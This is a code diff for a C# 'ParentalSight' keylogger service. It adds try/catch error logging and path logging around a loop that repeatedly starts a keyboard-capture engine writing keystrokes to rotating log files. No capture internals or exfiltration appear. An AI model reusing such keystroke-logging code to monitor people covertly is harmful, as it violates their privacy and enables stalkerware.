@@ -3,12 +3,9 @@
     using Microsoft.Extensions.Logging;
     using ParentalSight;
     using ParentalSight.Common.Builders;
-    using ParentalSight.Core.Screenshot;
     using ParentalSight.Keylogger.Engines;
     using System;
-    using System.Collections.Generic;
     using System.IO;
-    using System.Text;
     using System.Threading;
     using System.Threading.Tasks;
 
@@ -23,7 +20,7 @@
             _logger = logger;
         }
 
-        public async Task StartAsync(CancellationToken stoppingToken)
+        public Task StartAsync(CancellationToken stoppingToken)
         {
             // TODO: Move to central point which also includes ther logged in users name
             if (!Directory.Exists(_options.OutputPath))
@@ -33,19 +30,35 @@
 
             while (!stoppingToken.IsCancellationRequested)
             {
-                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
+                try
+                {
+                    _logger.LogInformation("KeyloggerService : Worker running at: {time}", DateTimeOffset.Now);
+                    _logger.LogInformation("KeyloggerService : Output path: {path}", _options.OutputPath);
 
-                var log = new FilenameBuilder()
-                    .WithPrefix("logger-")
-                    .WithExtension("log")
-                    .Build();
+                    var log = new FilenameBuilder()
+                        .WithPrefix("logger-")
+                        .WithExtension("log")
+                        .Build();
+                    _logger.LogInformation("KeyloggerService : Filename: {filename}", log);
 
-                var filepath = Path.Combine(_options.OutputPath, log);
-                var engine = new KeyboardLoggerEngine(filepath);
+                    var filepath = Path.Combine(_options.OutputPath, log);
+                    var engine = new KeyboardLoggerEngine(filepath);
 
-                var loggerFileWriteExpiration = DateTime.Now.AddMilliseconds(_options.LogRotationInMilliseconds);
-                engine.StartKeylogger(loggerFileWriteExpiration);
+                    var loggerFileWriteExpiration = DateTime.Now.AddMilliseconds(_options.LogRotationInMilliseconds);
+                    engine.StartKeylogger(loggerFileWriteExpiration);
+                }
+                catch (Exception ex)
+                {
+                    _logger.LogError("KeyloggerService : {type} {message}\n{stackTrace}", ex.GetType().Name, ex.Message, ex.StackTrace);
+                    if (ex.InnerException != null)
+                    {
+                        _logger.LogError("KeyloggerService : {type} {message}\n{stackTrace}",
+                            ex.InnerException.GetType().Name, ex.InnerException.Message, ex.InnerException.StackTrace);
+                    }
+                }
             }
+
+            return Task.CompletedTask;
         }
     }
 }
